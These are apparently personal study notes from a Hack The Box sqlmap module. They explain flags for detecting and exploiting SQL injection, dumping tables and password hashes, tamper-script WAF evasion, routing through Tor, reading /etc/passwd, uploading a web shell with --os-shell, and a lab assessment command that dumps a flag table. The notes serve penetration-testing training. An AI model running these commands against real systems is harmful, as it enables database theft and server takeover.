# sqlmap

## sqlmap

\*sqlmap  is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws.

The technique characters `BEUSTQ` refers to the following:

* `B`: Boolean-based blind
* `E`: Error-based
* `U`: Union query-based
* `S`: Stacked queries
* `T`: Time-based blind
* `Q`: Inline queries

In `sqlmap`, the `--batch` flag is the **"Automatic Pilot"** mode.

By default, `sqlmap` is a highly interactive tool. Whenever it reaches a crossroads—such as deciding whether to follow a redirect, which technique to prioritize, or whether to use a specific dictionary for a password crack—it stops and asks you for a `[Y/n]` (Yes/no) input.

When you add `--batch` to your command, you are telling the tool: **"Don't ask me any questions; just pick the default answer for everything and keep going**

When `sqlmap` asks a question, it usually looks like this: `[Y/n]` or `[y/N]`. The **Capital Letter** is the "Default" choice. Using `--batch` tells the tool to **always pick the capital letter**

**The "Default" Logic**

While it says "Yes" about 90% of the time, it’s technically picking the **safest or most common path** defined by the developers.

* **When it says "Yes" (`[Y/n]`):** "Do you want to keep testing this parameter?" or "Do you want to use the current DBMS's specific payloads?" (Usually the right move).
* **When it says "No" (`[y/N]`):** "Do you want to perform a heavy dictionary-based password crack that might take 5 hours?" (Usually a 'No' to save you time unless you specifically ask for it).

## Running SQLMap on an HTTP Request

***

SQLMap has numerous options and switches that can be used to properly set up the (HTTP) request before its usage.

In many cases, simple mistakes such as forgetting to provide proper cookie values, over-complicating setup with a lengthy command line, or improper declaration of formatted POST data, will prevent the correct detection and exploitation of the potential SQLi vulnerability.

***

### Curl Commands

One of the best and easiest ways to properly set up an SQLMap request against the specific target (i.e., web request with parameters inside) is by utilizing `Copy as cURL` feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools:![Network panel showing a GET request to www.example.com with a 404 status, and a context menu with options like 'Copy as cURL'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/58/M5UVR6n.png)

By pasting the clipboard content (`Ctrl-V`) into the command line, and changing the original command `curl` to `sqlmap`, we are able to use SQLMap with the identical `curl` command:

```
    shellsession
```

`Umedh@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'`

When providing data for testing to SQLMap, there has to be either a parameter value that could be assessed for SQLi vulnerability or specialized options/switches for automatic parameter finding (e.g. `--crawl`, `--forms` or `-g`).

***

### GET/POST Requests

In the most common scenario, `GET` parameters are provided with the usage of option `-u`/`--url`, as in the previous example. As for testing `POST` data, the `--data` flag can be used, as follows:

```
Umedh@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

```
Umedh@htb[/htb]$ sqlmap -u www.target.com --data='id=1' --method PUT
```

In here it uses the request method to PUT and uses the data proved in the data flag for the injection point

```
sqlmap -r req2.txt --batch --os-shell
```

In here it helps to get the reverse shell and also in here we used the -r flag it helps for the request that takes form the req2.txt file in that req2.txt is full http request is stored

```
C:\home\umedh> sqlmap -r req2.txt --batch --dump --method POST
```

when ever you use the --dump means it can go for the each and every data and find it and it give to use

```
Umedh@htb[/htb]$ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c' -dbs
```

-dbs means find which data base is using the backend like(sql, mysql)

```
Umedh@htb[/htb]$ sqlmap -u www.target.com --data='id=1' --method PUT
```

While SQLMap, by default, targets only the HTTP parameters, it is possible to test the headers for the SQLi vulnerability. The easiest way is to specify the "custom" injection mark after the header's value (e.g. `--cookie="id=1*"`). The same principle applies to any other part of the request.

Also, if we wanted to specify an alternative HTTP method, other than `GET` and `POST` (e.g., `PUT`), we can utilize the option `--method`, as follows:

**The 5 Levels of `--level`**

The `level` parameter (1 to 5) determines **where** `sqlmap` looks for injection points and how many payloads it tries. The higher the level, the more thorough (and slower) the scan.

| **Level** | **What it tests**                                                                          |
| --------- | ------------------------------------------------------------------------------------------ |
| **1**     | **Default.** Tests all GET and POST parameters.                                            |
| **2**     | Adds testing for **HTTP Cookie** headers.                                                  |
| **3**     | Adds testing for **HTTP User-Agent** and **Referer** headers.                              |
| **4**     | Adds more exhaustive payloads and tests for less common injection points.                  |
| **5**     | The "Maximum" depth. Tests **Host** headers and every possible string for every technique. |

**The 3 Risks of `--risk`**

The `risk` parameter (1 to 3) determines the **type** of payloads used. Higher risks can find more vulnerabilities, but they can also be "noisy" or even "dangerous" to the database's data integrity.

* **Risk 1 (Default):**
  * Safe for the server.
  * Uses standard, non-destructive payloads.
* **Risk 2:**
  * Adds **heavy query-based** time-based injections.
  * Can slow down the database or cause higher CPU usage on the target.
* **Risk 3:**
  * Adds **`OR`-based** boolean-based injections (e.g., `OR 1=1`).
  * **Warning:** This can be dangerous if the injection is in an `UPDATE` or `DELETE` statement, as it could accidentally modify or delete every row in a table.

we could mark it inside the provided data with the usage of special marker `*` as follows:

```
Umedh@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

```
sqlmap -u "http://154.57.164.74:32538/case3.php" --cookie="id=1" -p id --level 2 --batch --dbs --dump
```

**`-p id`**: Tells `sqlmap` to **only** test the `id` parameter. This prevents it from wasting time testing things like the `User-Agent`.

The first step is usually to switch the `--parse-errors`, to parse the DBMS errors (if any) and displays them as part of the program run: With this option, SQLMap will automatically print the DBMS error, thus giving us clarity on what the issue may be so that we can properly fix it.

```
Umedh@htb[/htb]$ sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt ...SNIP...
 Umedh@htb[/htb]$ cat /tmp/traffic.txt HTTP request 
 [#1]: GET /?id=1 HTTP/1.1 
 Host: www.example.com 
 Cache-control: no-cache 
 Accept-encoding: gzip,deflate 
 Accept: */* User-agent: sqlmap/1.4.9 (http://sqlmap.org) 
 Connection: close
```

The `-t` option stores the whole traffic content to an output file

| **Level** | **Flag** | **Description**                                             | **Best Used For...**                                                       |
| --------- | -------- | ----------------------------------------------------------- | -------------------------------------------------------------------------- |
| **0**     | `-v 0`   | Show only Python tracebacks, errors, and critical messages. | Automated scripts where you only care if the tool crashes.                 |
| **1**     | `-v 1`   | Show Info, Warning, Error, and Critical messages.           | **Default mode.** Standard scanning when everything is working fine.       |
| **2**     | `-v 2`   | Show Debug messages.                                        | Troubleshooting connection issues or minor logic errors.                   |
| **3**     | `-v 3`   | Show the **actual SQL Payloads** being sent.                | **The "Learning" Level.** Essential for understanding the injection logic. |
| **4**     | `-v 4`   | Show the **Raw HTTP Requests**.                             | Analyzing how `sqlmap` is formatting headers and data (WAF testing).       |
| **5**     | `-v 5`   | Show **HTTP Response Headers**.                             | Checking for server-side changes, cookies, or 302 redirects.               |
| **6**     | `-v 6`   | Show the **Full HTTP Response Page Content**.               | Maximum debugging; seeing the exact HTML the server returns.               |

we can utilize the `--proxy` option to redirect the whole traffic through a (MiTM) proxy (e.g., `Burp`). This will route all SQLMap traffic through `Burp`, so that we can later manually investigate all requests, repeat them, and utilize all features of `Burp` with these requests

```
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

For such runs, options `--prefix` and `--suffix` can be used as follows

| **Flag / Option**  | **Use Case**                                                                                                               | **Example Command**                  |
| ------------------ | -------------------------------------------------------------------------------------------------------------------------- | ------------------------------------ |
| **`--prefix`**     | Used when the query requires specific characters (like brackets or quotes) before your payload to "break out" of the code. | `sqlmap -u "URL" --prefix="%'))"`    |
| **`--suffix`**     | Used to comment out the rest of the original SQL query to prevent syntax errors.                                           | `sqlmap -u "URL" --suffix="-- -"`    |
| **`--level`**      | Increases the number of **boundaries** (prefixes/suffixes) and locations (headers, cookies) tested (1 to 5).               | `sqlmap -u "URL" --level=5`          |
| **`--risk`**       | Increases the number of **vectors** (payloads) used, including those that might be destructive or noisy (1 to 3).          | `sqlmap -u "URL" --risk=3`           |
| **`-v`**           | Sets verbosity. Level 3 is key because it shows the actual `[PAYLOAD]` being sent.                                         | `sqlmap -u "URL" -v 3`               |
| **`--code`**       | Fixes detection based on a specific HTTP status code (e.g., finding the difference between a 200 and a 500).               | `sqlmap -u "URL" --code=200`         |
| **`-fitles`**      | Bases the comparison between True and False responses only on the content of the `<title>` tag.                            | `sqlmap -u "URL" --titles`           |
| **`--string`**     | Used when a specific word (like "Welcome") appears only on a "True" page.                                                  | `sqlmap -u "URL" --string="success"` |
| **`--text-only`**  | Strips away all HTML/Javascript and compares only the visible text on the page.                                            | `sqlmap -u "URL" --text-only`        |
| **`--technique`**  | Limits tests to specific types (B: Boolean, E: Error, U: Union, S: Stacked, T: Time).                                      | `sqlmap -u "URL" --technique=BEU`    |
| **`--union-cols`** | Manually tells SQLMap how many columns are in the query if it fails to find them automatically.                            | `sqlmap -u "URL" --union-cols=17`    |
| **`--union-char`** | Replaces the default `NULL` values in a UNION query with a specific character/string.                                      | `sqlmap -u "URL" --union-char='a'`   |
| **`--union-from`** | Adds a `FROM [table]` to the end of a UNION query (essential for databases like Oracle).                                   | `sqlmap -u "URL" --union-from=users` |

| **Goal**                  | **Command Flag**     | **Example**                          |
| ------------------------- | -------------------- | ------------------------------------ |
| **Search for a Column**   | `--search -C [word]` | `sqlmap -u "URL" --search -C flag`   |
| **Search for a Table**    | `--search -T [word]` | `sqlmap -u "URL" --search -T admin`  |
| **Search for a Database** | `--search -D [word]` | `sqlmap -u "URL" --search -D backup` |

```
sqlmap -u "http://154.57.164.80:31093/case5.php?id=1" --grep="flag" --batch
sqlmap -u "URL" --file-read="/var/www/html/flag.txt"
```

| **Flag**                 | **Category** | **Purpose**                                                            |
| ------------------------ | ------------ | ---------------------------------------------------------------------- |
| **`--banner`**           | Basic Info   | Retrieves the DBMS version and system details.                         |
| **`--current-user`**     | Basic Info   | Shows the database user currently executing the queries.               |
| **`--current-db`**       | Basic Info   | Retrieves the name of the database the application is currently using. |
| **`--is-dba`**           | Basic Info   | Checks if the current user has administrative (DBA) privileges.        |
| **`--tables`**           | Enumeration  | Lists all tables within a specific database.                           |
| **`-D`**                 | Targeting    | Specifies the name of the **Database** to target.                      |
| **`-T`**                 | Targeting    | Specifies the name of the **Table** to target.                         |
| **`-C`**                 | Targeting    | Specifies specific **Columns** to dump (e.g., `-C name,password`).     |
| **`--dump`**             | Action       | Downloads/Exfiltrates the data from the specified target.              |
| **`--start` / `--stop`** | Filtering    | Dumps a specific range of rows (useful for huge tables).               |
| **`--where`**            | Filtering    | Applies a SQL `WHERE` condition to filter the dumped data.             |
| **`--exclude-sysdbs`**   | Optimization | Tells SQLMap to skip system databases like `information_schema`.       |
| **`--dump-all`**         | Action       | Dumps every single table from every single database.                   |
| **`--dump-format`**      | Output       | Changes the output file type (CSV, HTML, or SQLite).                   |

* **To get basic system info:** `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`
* **To list tables in a database named `testdb`:** `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`
* **To dump all data from the `users` table:** `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb`
* **To dump only the `name` and `surname` columns:** `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`
* **To dump only the 2nd and 3rd rows:** `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3`
* **To dump rows where the name starts with 'f':** `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`

| **Flag**          | **Use Case**                                                                                                                                                                              | **Example Command**                   |
| ----------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------- |
| **`--schema`**    | Used to map out the entire architecture of the database. It retrieves all database names, their tables, and the column names/types **without** downloading the actual row data.           | `sqlmap -u "URL" --schema --batch`    |
| **`--passwords`** | Used to find and exfiltrate the **password hashes** for all database users (e.g., `root`, `admin`, `web_user`). SQLMap will also offer to "crack" them for you using a built-in wordlist. | `sqlmap -u "URL" --passwords --batch` |

* **Anti-Automation (Tokens & Randomization):** Websites use **CSRF tokens** or require **unique values** to ensure a human is clicking the buttons. SQLMap can "grab" these tokens from the page and use them in the next attack automatically.
* **Calculated Values:** Sometimes a parameter depends on another (like a hash of the ID). SQLMap can run actual **Python code** on your machine to calculate these values before every single request.
* **Stealth & Anonymity:** To avoid being banned, you can route your traffic through **Proxies** or the **Tor network**. You can also change your **User-Agent** so the server thinks you're using a normal browser like Chrome instead of "sqlmap/1.4.9".
* **WAF/IPS Evasion:** Web Application Firewalls (WAF) look for keywords like `UNION` or `SELECT`. **Tamper scripts** are the "secret sauce" here—they rewrite your SQL code into a format the firewall doesn't recognize but the database still understands.
* **Advanced Logic:** Techniques like **Chunked Transfer Encoding** (splitting the request into pieces) or **HTTP Parameter Pollution** (repeating parameters) can "confuse" security filters so they let the malicious payload pass through.

| **Flag**             | **Purpose**                                                                               | **Example Command**                                                       |
| -------------------- | ----------------------------------------------------------------------------------------- | ------------------------------------------------------------------------- |
| **`--csrf-token`**   | Tells SQLMap which parameter holds the anti-CSRF token so it can update it every request. | `sqlmap -u "URL" --csrf-token="csrf-token" --data='id=1&csrf-token=1234'` |
| **`--randomize`**    | Changes the value of a specific parameter to a random number for every request.           | `sqlmap -u "URL" --randomize=rp`                                          |
| **`--eval`**         | Runs Python code to calculate a parameter value before sending the request.               | `sqlmap -u "URL" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"`  |
| **`--proxy`**        | Routes all traffic through a specific proxy server.                                       | `sqlmap -u "URL" --proxy="socks4://1.2.3.4:8080"`                         |
| **`--tor`**          | Automatically finds and uses a local Tor service for anonymity.                           | `sqlmap -u "URL" --tor`                                                   |
| **`--check-tor`**    | Verifies that Tor is actually working before starting the attack.                         | `sqlmap -u "URL" --check-tor`                                             |
| **`--skip-waf`**     | Skips the initial test that looks for a firewall (useful for staying quiet).              | `sqlmap -u "URL" --skip-waf`                                              |
| **`--random-agent`** | Uses a random browser "User-Agent" header to bypass blacklists.                           | `sqlmap -u "URL" --random-agent`                                          |
| **`--tamper`**       | Applies specific Python scripts to "scramble" the payload to hide it from a WAF.          | `sqlmap -u "URL" --tamper=between,randomcase`                             |
| **`--chunked`**      | Splits the POST request body into smaller chunks to bypass keyword filters.               | `sqlmap -u "URL" --chunked`                                               |
| **`--list-tampers`** | Displays a list of every available tamper script and what they do.                        | `sqlmap --list-tampers`                                                   |

| **Tamper-Script**           | **Description**                                                                                                                  |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| `0eunion`                   | Replaces instances of UNION with e0UNION                                                                                         |
| `base64encode`              | Base64-encodes all characters in a given payload                                                                                 |
| `between`                   | Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`                 |
| `commalesslimit`            | Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart                                                 |
| `equaltolike`               | Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart                                                         |
| `halfversionedmorekeywords` | Adds (MySQL) versioned comment before each keyword                                                                               |
| `modsecurityversioned`      | Embraces complete query with (MySQL) versioned comment                                                                           |
| `modsecurityzeroversioned`  | Embraces complete query with (MySQL) zero-versioned comment                                                                      |
| `percentage`                | Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)                                            |
| `plus2concat`               | Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart                                                          |
| `randomcase`                | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)                                                   |
| `space2comment`             | Replaces space character ( ) with comments \`/                                                                                   |
| `space2dash`                | Replaces space character ( ) with a dash comment (`--`) followed by a random string and a new line (`\n`)                        |
| `space2hash`                | Replaces (MySQL) instances of space character ( ) with a pound character (`#`) followed by a random string and a new line (`\n`) |
| `space2mssqlblank`          | Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters         |
| `space2plus`                | Replaces space character ( ) with plus (`+`)                                                                                     |
| `space2randomblank`         | Replaces space character ( ) with a random blank character from a valid set of alternate characters                              |
| `symboliclogical`           | Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|`)                                           |
| `versionedkeywords`         | Encloses each non-function keyword with (MySQL) versioned comment                                                                |
| `versionedmorekeywords`     | Encloses each keyword with (MySQL) versioned comment                                                                             |

| **Flag / Option**  | **Purpose**                                                                                                                         | **Example Command**                            |
| ------------------ | ----------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------- |
| **`--is-dba`**     | **The First Step.** Checks if the current database user has admin rights. If this is `False`, the other commands likely won't work. | `sqlmap -u "URL" --is-dba`                     |
| **`--file-read`**  | Downloads a specific file from the server's hard drive to your local machine.                                                       | `sqlmap -u "URL" --file-read "/etc/passwd"`    |
| **`--file-write`** | The "Upload" tool. Specifies the **local file** on your machine you want to upload.                                                 | `sqlmap -u "URL" --file-write "shell.php" ...` |
| **`--file-dest`**  | Used with `--file-write` to tell SQLMap the **exact path** on the server where the file should be saved.                            | `... --file-dest "/var/www/html/shell.php"`    |
| **`--os-shell`**   | **The Ultimate Goal.** Automatically uploads a web shell and gives you an interactive terminal to run Linux commands.               | `sqlmap -u "URL" --os-shell`                   |

\*\*The payload used in the skill assessment

```
sqlmap 'http://154.57.164.81:30227/action.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/json' -H 'Origin: http://94.237.61.82:57625' -H 'Connection: keep-alive' -H 'Referer: http://94.237.61.82:57625/shop.html' -H 'Priority: u=0' --data-raw '{"id":1}' --tamper=between --dump -T "final_flag"
```
